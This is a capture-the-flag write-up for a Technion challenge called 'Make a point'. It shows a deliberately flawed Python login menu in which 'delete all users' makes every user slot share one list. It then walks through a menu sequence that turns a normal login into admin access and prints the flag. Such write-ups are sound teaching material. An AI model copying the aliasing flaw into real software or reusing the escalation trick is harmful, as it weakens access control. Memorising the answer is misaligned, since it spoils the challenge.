# Make a point
Category: Misc., 100 points

## Description

> Due to a worldwide virus all of our users now need to work from home. So we created a brand-new remote system for them to keep their flags online. But lately we started to suspect that someone succeeded to get the Admin's flag. Can you point us to the right direction?
> 
> (no brute force is needed)

```python
from passwords import ADMIN_PASSWD
from flag import FLAG

DUMMY_FLAG = "cstechnion{dummy_fl4g_p134se_don7_try_t0_3nter_1t}"
MAX_USERS_NUM = 8
NAME_ID = 0
PASS_ID = 1
IS_ADMIN_ID = 2

users = [[None, None, None] for _ in range(MAX_USERS_NUM)]
logged_in = None

def get_flag():
    if logged_in == None:
        print("you should be logged in :)")
        return

    if users[logged_in][IS_ADMIN_ID]:
        print(FLAG)
    else:
        print(DUMMY_FLAG)

def add_admin_user():
    user_id = _choose_uesr_slot()

    if user_id == None:
        return
    if _is_slot_occupied(user_id):
        return

    users[user_id][NAME_ID] = "Admin"
    users[user_id][PASS_ID] = ADMIN_PASSWD
    users[user_id][IS_ADMIN_ID] = True
    print(f"admin user created in slot number {user_id}")

def add_normal_user():
    user_id = _choose_uesr_slot()

    if user_id == None:
        return
    if _is_slot_occupied(user_id):
        return

    users[user_id][NAME_ID] = input("enter new name please:")
    users[user_id][PASS_ID] = input("enter new password please:")
    users[user_id][IS_ADMIN_ID] = False
    print(f"user created in slot number {user_id}")

def login():
    global logged_in
    user_id = _choose_uesr_slot()

    if user_id == None:
        return
    if not _get_password(user_id):
        return

    logged_in = user_id
    print("you are logged in!")

def logout():
    global logged_in
    logged_in = None

    print("logout done")

def delete_user():
    global logged_in
    user_id = _choose_uesr_slot()

    if user_id == None:
        return
    users[user_id][PASS_ID] = None
    users[user_id][NAME_ID] = None
    users[user_id][IS_ADMIN_ID] = None
    print("user deleted")

    if user_id == logged_in:
        print("you were logged out")
        logged_in = None

def delete_all_users():
    global logged_in, users
    users = [[None, None, None]] * MAX_USERS_NUM
    logged_in = None

    print("all users deleted")

ops = [
        get_flag,
        add_admin_user,
        add_normal_user,
        login,
        logout,
        delete_user,
        delete_all_users,
		exit
        ]

MENU = """please select an option:
\t0) get flag!
\t1) add admin user
\t2) add normal user
\t3) login
\t4) logout
\t5) delete user
\t6) delete all users
\t7) exit
"""

def _get_option(input_range):
    option = input(">> ")

    # check if input is a number
    if not option.isdigit():
        print("error. invalid option. try again")
        return None

    # check if input is in valid range
    option = int(option)
    if option not in range(input_range):
        print("error. invalid option number. try again")
        return None

    return option

def _choose_option_from_menu():
    global logged_in

    print("\nwelcome!")
    if logged_in == None:
        print("(you are not logged in)")
    else:
        print(f"hi {users[logged_in][NAME_ID]}!")
        print("you're logged in as user number:", logged_in)

    print(MENU)
    print("choose an option(0-7):")
    return _get_option(len(ops))

def _choose_uesr_slot():
    print("choose user slot(0-7)")
    for i in range(MAX_USERS_NUM):
        print(f"\t{i}) {users[i][NAME_ID]}")
    return _get_option(MAX_USERS_NUM)

def _get_password(user_id):
    password = input("enter the user password please:")

    if users[user_id][PASS_ID] != password:
        print("invalid password. go away!")
        return False
    return True

def _is_slot_occupied(user_id):
    if users[user_id] != [None, None, None]:
        print("error. slot already occupied")
        return True
    return False

def main():
    while(True):
        option = _choose_option_from_menu()

        if option == None: # invalid option
            continue
        if option == 7: #exit
            break

        ops[option]()
    print("bye bye")

if __name__ == "__main__":
    main()

```

## Solution

This challenge offers us 8 user slots and allows us to create either regular users or admin users in each of the slots. For regular users, we provide the password, while admin users use a predefined password. Only admin users should be able to call a function to read the flag, how can we get it anyway?

Searching the code for vulnerabilities, we can notice the following difference. The `users` list is initially initializes as `users = [[None, None, None] for _ in range(MAX_USERS_NUM)]`, but the `delete_all_users` function re-initializes it using `users = [[None, None, None]] * MAX_USERS_NUM`. This is an important difference! While the first method creates a different list for each user, the second one duplicates the same list `MAX_USERS_NUM` times, as seen in the following experiment. First, we add an admin user without deleting all users:

```console
┌──(user@kali)-[/media/sf_CTFs/technion/Make_a_point]
└─$ nc ctf.cs.technion.ac.il 4142

welcome!
(you are not logged in)
please select an option:
        0) get flag!
        1) add admin user
        2) add normal user
        3) login
        4) logout
        5) delete user
        6) delete all users
        7) exit

choose an option(0-7):
>> 1
choose user slot(0-7)
        0) None
        1) None
        2) None
        3) None
        4) None
        5) None
        6) None
        7) None
>> 0
admin user created in slot number 0

welcome!
(you are not logged in)
please select an option:
        0) get flag!
        1) add admin user
        2) add normal user
        3) login
        4) logout
        5) delete user
        6) delete all users
        7) exit

choose an option(0-7):
>> 3
choose user slot(0-7)
        0) Admin
        1) None
        2) None
        3) None
        4) None
        5) None
        6) None
        7) None
```

If we delete all users, here's what happens:

```console
┌──(user@kali)-[/media/sf_CTFs/technion/Make_a_point]
└─$ nc ctf.cs.technion.ac.il 4142

welcome!
(you are not logged in)
please select an option:
        0) get flag!
        1) add admin user
        2) add normal user
        3) login
        4) logout
        5) delete user
        6) delete all users
        7) exit

choose an option(0-7):
>> 6
all users deleted

welcome!
(you are not logged in)
please select an option:
        0) get flag!
        1) add admin user
        2) add normal user
        3) login
        4) logout
        5) delete user
        6) delete all users
        7) exit

choose an option(0-7):
>> 1
choose user slot(0-7)
        0) None
        1) None
        2) None
        3) None
        4) None
        5) None
        6) None
        7) None
>> 0
admin user created in slot number 0

welcome!
(you are not logged in)
please select an option:
        0) get flag!
        1) add admin user
        2) add normal user
        3) login
        4) logout
        5) delete user
        6) delete all users
        7) exit

choose an option(0-7):
>> 3
choose user slot(0-7)
        0) Admin
        1) Admin
        2) Admin
        3) Admin
        4) Admin
        5) Admin
        6) Admin
        7) Admin
```

Now, in order to print the flag, we need `users[logged_in][IS_ADMIN_ID]` to be true. Here's how we achieve that using the bug we found.

First, we delete all users to make all slots refer to the same list:

```
welcome!
(you are not logged in)
please select an option:
        0) get flag!
        1) add admin user
        2) add normal user
        3) login
        4) logout
        5) delete user
        6) delete all users
        7) exit

choose an option(0-7):
>> 6
all users deleted

```

Then, we create a normal user:

```
welcome!
(you are not logged in)
please select an option:
        0) get flag!
        1) add admin user
        2) add normal user
        3) login
        4) logout
        5) delete user
        6) delete all users
        7) exit

choose an option(0-7):
>> 2
choose user slot(0-7)
        0) None
        1) None
        2) None
        3) None
        4) None
        5) None
        6) None
        7) None
>> 0
enter new name please:Test
enter new password please:Test
user created in slot number 0

welcome!
(you are not logged in)
```

We login as this user:

```
please select an option:
        0) get flag!
        1) add admin user
        2) add normal user
        3) login
        4) logout
        5) delete user
        6) delete all users
        7) exit

choose an option(0-7):
>> 3
choose user slot(0-7)
        0) Test
        1) Test
        2) Test
        3) Test
        4) Test
        5) Test
        6) Test
        7) Test
>> 0
enter the user password please:Test
you are logged in!

welcome!
hi Test!
you're logged in as user number: 0
```

This sets `logged_in = user_id` which is `0`. We now want to add an admnin user, but we can only do that if there is some empty slot. So we delete slot #1:

```
please select an option:
        0) get flag!
        1) add admin user
        2) add normal user
        3) login
        4) logout
        5) delete user
        6) delete all users
        7) exit

choose an option(0-7):
>> 5
choose user slot(0-7)
        0) Test
        1) Test
        2) Test
        3) Test
        4) Test
        5) Test
        6) Test
        7) Test
>> 1
user deleted

welcome!
hi None!
you're logged in as user number: 0
```

It's important not to delete the slot we're logged in under, since doing that will execute:

```python
    if user_id == logged_in:
        print("you were logged out")
        logged_in = None
```

However, given that we're logged in under `0` and deleted `1`, `logged_in` stays set to `0`.

Now, we add the admin:

```
please select an option:
        0) get flag!
        1) add admin user
        2) add normal user
        3) login
        4) logout
        5) delete user
        6) delete all users
        7) exit

choose an option(0-7):
>> 1
choose user slot(0-7)
        0) None
        1) None
        2) None
        3) None
        4) None
        5) None
        6) None
        7) None
>> 1
admin user created in slot number 1

welcome!
hi Admin!
you're logged in as user number: 0

```

Finally, we can get the flag and exit:

```
please select an option:
        0) get flag!
        1) add admin user
        2) add normal user
        3) login
        4) logout
        5) delete user
        6) delete all users
        7) exit

choose an option(0-7):
>> 0
cstechnion{p01nters_poin73r5_ev3rywher3_6a7b32e}

welcome!
hi Admin!
you're logged in as user number: 0
please select an option:
        0) get flag!
        1) add admin user
        2) add normal user
        3) login
        4) logout
        5) delete user
        6) delete all users
        7) exit

choose an option(0-7):
>> 7
bye bye
```